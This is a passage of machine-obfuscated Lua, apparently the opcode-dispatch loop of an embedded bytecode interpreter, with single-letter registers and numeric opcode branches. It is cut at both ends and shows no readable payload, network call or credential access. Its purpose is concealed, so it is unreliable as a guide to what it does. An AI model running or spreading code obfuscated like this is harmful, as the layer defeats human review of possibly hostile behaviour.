bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else if(w[y[870]]<w[y[716]])then n=n+1;else n=y[312];end;end;elseif 224>=z then if 222>=z then w[y[870]][y[312]]=y[716];elseif z>223 then local ba;local bb;w={};for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bb=y[870];ba=w[y[312]];w[bb+1]=ba;w[bb]=ba[y[716]];else local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 225>=z then local ba=y[870];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;elseif 226==z then local q;local x;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={r({},1,y[312])};n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];x=y[870];q=w[x];for ba=x+1,y[312]do t(q,w[ba])end;else local q=d[y[312]];local x={};local ba={};for bb=1,y[716]do n=n+1;local bc=f[n];if bc[119]==165 then ba[bb-1]={w,bc[312]};else ba[bb-1]={h,bc[312]};end;v[#v+1]=ba;end;m(x,{['\95\95\105\110\100\101\120']=function(bb,bb)local bb=ba[bb];return bb[1][bb[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bb,bb,bc)local ba=ba[bb]ba[1][ba[2]]=bc;end;});w[y[870]]=b(q,x,j);end;elseif z<=233 then if z<=230 then if(228>=z)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0==q then x=nil else ba=nil end else if q<=2 then bb=nil else if 3<q then n=n+1;else w[y[870]]=h[y[312]];end end end else if q<=6 then if 6>q then y=f[n];else w[y[870]]=h[y[312]];end else if q<=7 then n=n+1;else if q~=9 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if 14~=q then n=n+1;else y=f[n];end end end else if q<=16 then if 15<q then ba={w[bb](w[bb+1])};else bb=y[870]end else if q<=17 then x=0;else if q>18 then break else for bc=bb,y[716]do x=x+1;w[bc]=ba[x];end end end end end end q=q+1 end elseif(230>z)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0==q then x=nil else ba=nil end else if q<=2 then bb=nil else if 4~=q then w[y[870]]=h[y[312]];else n=n+1;end end end else if q<=6 then if 5<q then w[y[870]]=h[y[312]];else y=f[n];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if q<=14 then if q<=11 then if q==10 then n=n+1;else y=f[n];end else if q<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if q~=14 then n=n+1;else y=f[n];end end end else if q<=16 then if 15==q then bb=y[870]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q<19 then for bc=bb,y[716]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end else w[y[870]]={};end;elseif 231>=z then local q=y[870];local x,ba,bb=w[q],w[(q+1)],w[(q+2)];local x=(x+bb);w[q]=x;if(bb>0 and(x<=ba)or(bb<0 and x>=ba))then n=y[312];w[q+3]=x;end;elseif z>232 then local q;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];q=y[870]w[q](r(w,q+1,y[312]))else w[y[870]]={r({},1,y[312])};end;elseif 236>=z then if 234>=z then local q=y[870]local i,x=i(w[q](w[q+1]))p=x+q-1 local x=0;for ba=q,p do x=x+1;w[ba]=i[x];end;elseif 236~=z then local i;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];i=y[870]w[i]=w[i]()else local i;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];i=y[870]w[i]=w[i](r(w,i+1,y[312]))end;elseif 237>=z then local i;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];i=y[870]w[i]=w[i](r(w,i+1,y[312]))elseif 238==z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;else local i;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];i=y[870]w[i]=w[i](r(w,i+1,y[312]))end;elseif 263>=z then if z<=251 then if z<=245 then if 242>=z then if(z==240 or z<240)then local i=w[y[716]];if not i then n=n+1;else w[y[870]]=i;n=y[312];end;elseif(z<242)then w[y[870]][w[y[312]]]=w[y[716]];else local i,q=0 while true do if i<=11 then if i<=5 then if i<=2 then if i<=0 then q=nil else if i==1 then w[y[870]]=w[y[312]][y[716]];else n=n+1;end end else if i<=3 then y=f[n];else if i==4 then w[y[870]]=j[y[312]];else n=n+1;end end end else if i<=8 then if i<=6 then y=f[n];else if i~=8 then w[y[870]]=w[y[312]][y[716]];else n=n+1;end end else if i<=9 then y=f[n];else if 10<i then n=n+1;else w[y[870]]=w[y[312]][y[716]];end end end end else if i<=17 then if i<=14 then if i<=12 then y=f[n];else if i>13 then n=n+1;else w[y[870]]=w[y[312]][y[716]];end end else if i<=15 then y=f[n];else if 16<i then n=n+1;else w[y[870]]=w[y[312]][y[716]];end end end else if i<=20 then if i<=18 then y=f[n];else if i<20 then w[y[870]]=w[y[312]][y[716]];else n=n+1;end end else if i<=22 then if 21<i then q=y[870]else y=f[n];end else if 24>i then w[q]=w[q](r(w,q+1,y[312]))else break end end end end end i=i+1 end end;elseif z<=243 then local i;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];i=y[870]w[i]=w[i](r(w,i+1,y[312]))elseif 245>z then w[y[870]]=(not w[y[312]]);else local i;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];i=y[870]w[i]=w[i](r(w,i+1,y[312]))end;elseif z<=248 then if 246>=z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];n=y[312];elseif 247==z then local i;w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];i=y[870];w[i]=w[i]-w[i+2];n=y[312];else local i;local q;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={r({},1,y[312])};n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];q=y[870];i=w[q];for x=q+1,y[312]do t(i,w[x])end;end;elseif 249>=z then w[y[870]][w[y[312]]]=w[y[716]];elseif 251~=z then w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if not w[y[870]]then n=n+1;else n=y[312];end;else w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];end;elseif z<=257 then if 254>=z then if z<=252 then local i;w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];i=y[870]w[i](w[i+1])elseif z>253 then a(c,e);else local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end end;elseif z<=255 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=#w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870];w[a]=w[a]-w[a+2];n=y[312];elseif 256<z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];n=y[312];else local a;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 260>=z then if 258>=z then local a=y[312];local c=y[716];local a=k(w,g,a,c);w[y[870]]=a;elseif 259==z then n=y[312];else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;end;elseif z<=261 then local a=y[870]local c={}for e=1,#v do local i=v[e]for q=1,#i do local i=i[q]local q,q=i[1],i[2]if q>=a then c[q]=w[q]i[1]=c v[e]=nil;end end end elseif z>262 then w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];if(w[y[870]]~=y[716])then n=n+1;else n=y[312];end;else local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])end;elseif 275>=z then if z<=269 then if z<=266 then if z<=264 then local a=y[870];do return w[a](r(w,a+1,y[312]))end;elseif 265<z then w[y[870]]=w[y[312]]%y[716];else w[y[870]]=h[y[312]];end;elseif 267>=z then w[y[870]]=w[y[312]]/y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]-w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]/y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]*y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];n=y[312];elseif 268<z then do return w[y[870]]end else local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]*y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 272>=z then if z<=270 then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end elseif z==271 then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end else w[y[870]]=#w[y[312]];end;elseif 273>=z then local a;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))elseif 275~=z then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end else local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif z<=281 then if 278>=z then if 276>=z then local a;local c;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];c=y[870];a=w[c];for e=c+1,y[312]do t(a,w[e])end;elseif z==277 then local a=y[870]w[a](r(w,a+1,y[312]))else local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end end;elseif 279>=z then j[y[312]]=w[y[870]];elseif z==280 then w[y[870]]=h[y[312]];else w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];end;elseif z<=284 then if 282>=z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a]()elseif z<284 then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a]()else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];n=y[312];end;elseif z<=285 then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[870]]=j[y[312]];end else if 2<a then y=f[n];else n=n+1;end end else if a<=5 then if 5>a then w[y[870]]=w[y[312]][y[716]];else n=n+1;end else if a<=6 then y=f[n];else if a~=8 then w[y[870]]=y[312];else n=n+1;end end end end else if a<=13 then if a<=10 then if a>9 then w[y[870]]=y[312];else y=f[n];end else if a<=11 then n=n+1;else if 13>a then y=f[n];else w[y[870]]=y[312];end end end else if a<=15 then if a==14 then n=n+1;else y=f[n];end else if a<=16 then c=y[870]else if a<18 then w[c]=w[c](r(w,c+1,y[312]))else break end end end end end a=a+1 end elseif 286==z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;end;elseif 335>=z then if z<=311 then if 299>=z then if 293>=z then if z<=290 then if z<=288 then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end elseif 290~=z then local a=y[870]w[a]=w[a](r(w,a+1,y[312]))else do return end;end;elseif z<=291 then local a;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])elseif z~=293 then local a;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else w[y[870]]=b(d[y[312]],nil,j);end;elseif 296>=z then if z<=294 then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];e=y[312];c=y[716];a=k(w,g,e,c);w[y[870]]=a;elseif 296~=z then w[y[870]]=false;n=n+1;else w[y[870]]=w[y[312]]-w[y[716]];end;elseif z<=297 then w[y[870]]=#w[y[312]];elseif z<299 then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else local a=y[870];local c=y[716];local e=a+2;local i={w[a](w[a+1],w[e])};for q=1,c do w[e+q]=i[q];end local a=w[a+3];if a then w[e]=a;n=y[312];else n=n+1 end;end;elseif z<=305 then if z<=302 then if 300>=z then w[y[870]]=w[y[312]]*y[716];elseif 302>z then local a=y[870]local c={w[a](w[a+1])};local e=0;for i=a,y[716]do e=e+1;w[i]=c[e];end else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;end;elseif 303>=z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;elseif z>304 then w[y[870]]=w[y[312]][w[y[716]]];else local a;local c;local e;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end end;elseif z<=308 then if z<=306 then local a=y[870];local c=w[y[312]];w[a+1]=c;w[a]=c[w[y[716]]];elseif 307==z then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end else local a;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 309>=z then w[y[870]]=w[y[312]][w[y[716]]];elseif z~=311 then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+y[716];n=n+1;y=f[n];h[y[312]]=w[y[870]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;else local a;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a]()end;elseif 323>=z then if 317>=z then if 314>=z then if z<=312 then local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then n=n+1;else w[y[870]][y[312]]=y[716];end else if a<=2 then y=f[n];else if 4>a then w[y[870]]={};else n=n+1;end end end else if a<=6 then if 5<a then w[y[870]][y[312]]=w[y[716]];else y=f[n];end else if a<=7 then n=n+1;else if a==8 then y=f[n];else w[y[870]]=h[y[312]];end end end end else if a<=14 then if a<=11 then if a==10 then n=n+1;else y=f[n];end else if a<=12 then w[y[870]]=w[y[312]][y[716]];else if a==13 then n=n+1;else y=f[n];end end end else if a<=16 then if 15==a then w[y[870]][y[312]]=w[y[716]];else n=n+1;end else if a<=17 then y=f[n];else if 19~=a then w[y[870]][y[312]]=w[y[716]];else break end end end end end a=a+1 end elseif 314>z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])else local 